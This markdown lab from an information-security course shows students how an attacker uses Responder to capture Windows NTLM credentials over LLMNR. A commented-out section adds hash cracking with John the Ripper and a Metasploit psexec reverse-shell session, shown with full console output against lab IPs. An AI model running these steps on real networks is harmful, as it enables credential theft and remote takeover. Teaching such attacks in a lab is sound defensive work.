![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

---

This is a lab from **John Strand**'s **Information Security Core Skills** Course:

https://www.antisyphontraining.com/product/information-security-core-skills-tm/

---



# Responder

In this lab we are going to walk through how quickly an attacker can take advantage of a common misconfiguration to gain access to a system via a **weak** password.

Specifically, we are looking to take advantage of **"LLMNR"**.  

We will need to load our **linux terminal** and start responder.




- **Double-click** `Ubuntu Shell` on Desktop

<img width="90" height="104" alt="Screenshot From 2026-02-23 10-28-37" src="https://github.com/user-attachments/assets/196f7867-877b-4a37-bc02-1214e50e96a5" />


Next, we will navigate to the **Responder** directory:

```bash
cd ~/Intro_To_Security/Responder/
```

Now let’s start **Responder**:

```bash
responder -I ens5
```

You should see this:

<img width="313" height="541" alt="resp" src="https://github.com/user-attachments/assets/ca8c62ef-e845-4ad2-8a2a-59102a1e5d6d" />


Let's open **Windows File Explorer** and put in the string ```\\Linux-IP\Noooo``` into the address bar at the top.

<img width="502" height="55" alt="OpeningFileExplorer" src="https://github.com/user-attachments/assets/2de27ae0-5e58-4488-b7f3-ee6b313bec1e" />

<img width="929" height="488" alt="file_exp" src="https://github.com/user-attachments/assets/002bd08e-5d6a-4b31-9593-1feb0d979d47" />


It will pop up a windows to write the credentials. Fill them and switch back to your **Linux** terminal window.

<img width="374" height="337" alt="creds" src="https://github.com/user-attachments/assets/27799627-9ed3-4313-bd39-e7c6a0f841b7" />


After a few moments, you should see some captured data showing up.  

**Please note there may be an error.  That is OK.**

<img width="911" height="323" alt="file_exp_logs" src="https://github.com/user-attachments/assets/d2e3df52-44a3-4d6f-9ae0-af49c87e3898" />


We can do the same thing from the Windows Terminal by running the following command:

```bash
net use * \\10.10.102.57\share
```

<img width="420" height="225" alt="term_attempt" src="https://github.com/user-attachments/assets/7caad37f-ad48-4bfe-9c01-83f456f3c98f" />

As we can see we have the new captured data showing up.

<img width="910" height="160" alt="testing_log" src="https://github.com/user-attachments/assets/19ba8e38-f46d-4e32-a402-1b036d9aee23" />


***                                                                 
<b><i>Continuing the course? </br>[Next Lab](/IntroClassFiles/Tools/IntroClass/RITAIntroClass/RITA.md)</i></b>

<b><i>Want to go back? </br>[Previous Lab](/IntroClassFiles/Tools/IntroClass/PasswordSpray/PasswordSpray.md)</i></b>

<b><i>Looking for a different lab? </br>[Lab Directory](/IntroClassFiles/navigation.md)</i></b>

***Finished with the Labs?***

Please be sure to destroy the lab environment!

[Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)

---



<!--

THIS SECTION IS BEING REMOVED FOR THE TIME BEING PER JOHN

Next we need to kill Responder with `Ctrl + c`.  This will return the command prompt. 

Now, we need to change to the logs directory.

</pre>cd /opt/Responder/logs</pre>

Once there, we will need to start John The Ripper"

</pre>/opt/JohnTheRipper/run/john --format=netntlmv2 ./HTTP-NTLMv2-172.26.16.1.txt</pre>
Remember!  Your IP will be different!!!!


If you captured a NTLMv1 hash you can crack it with the following command:

root@DESKTOP-I1T2G01:/opt/Responder/logs# `/opt/JohnTheRipper/run/john --format=netntlm ./HTTP-NTLMv1-172.26.16.1.txt`
Remember!  Your IP will be different!!!!

Notice the v2 is dropped from the --format.

![](attachments/Clipboard_2020-06-23-14-24-11.png)

You should see the Windows password be cracked very quickly.  

Now, let’s use that password!

First, we will need to run a script that configures your system as though it is on a domain with little to no security between workstations.
Basically, it allows logons over the network.

Use file explorer to navigate to C:\IntroLabs

Then, Right-click on the smb.bat file and run it as Administrator:

![](attachments/SMB_bat.png)

Next, let’s open a new Kali instance. The easiest way to do this is to click the Kali icon in the taskbar.

![](attachments/TaskbarKaliIcon.png)

Now we are going to start up and launch Metasploit against the Windows system to get a Meterpreter session.

</pre>
adhd@DESKTOP-I1T2G01:/mnt/c/Users/adhd$ <b>sudo su -</b>
[sudo] password for adhd:
root@DESKTOP-I1T2G01:~#
root@DESKTOP-I1T2G01:~# <b>msfconsole -q</b>
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
msf5 ><b> use exploit/windows/smb/psexec</b>
msf5 exploit(windows/smb/psexec) >
msf5 exploit(windows/smb/psexec) ><b> set PAYLOAD windows/meterpreter/reverse_tcp</b>
PAYLOAD => windows/meterpreter/reverse_tcp
msf5 exploit(windows/smb/psexec) >
msf5 exploit(windows/smb/psexec) ><b> set RHOSTS 172.18.112.1 ###REMEMBER!!! YOUR WINDOWS IP WILL BE DIFFERENT</b>
RHOSTS => 172.18.112.1
msf5 exploit(windows/smb/psexec) ><b> set SMBUSER adhd</b>
SMBUSER => adhd
msf5 exploit(windows/smb/psexec) ><b> set SMBPASS adhd</b>
SMBPASS => adhd
msf5 exploit(windows/smb/psexec) ><b> exploit</b>

[*] Started reverse TCP handler on 172.18.121.248:4444
[*] 172.18.112.1:445 - Connecting to the server...
[*] 172.18.112.1:445 - Authenticating to 172.18.112.1:445 as user 'adhd'...
[*] 172.18.112.1:445 - Selecting PowerShell target
[*] 172.18.112.1:445 - Executing the payload...
[+] 172.18.112.1:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176195 bytes) to 172.18.112.1
[*] Meterpreter session 1 opened (172.18.121.248:4444 -> 172.18.112.1:52806) at 2022-10-18 12:39:56 -0600

meterpreter >
</pre>
Now, you can see just how bad LLMNR is!!!!
*/
-->







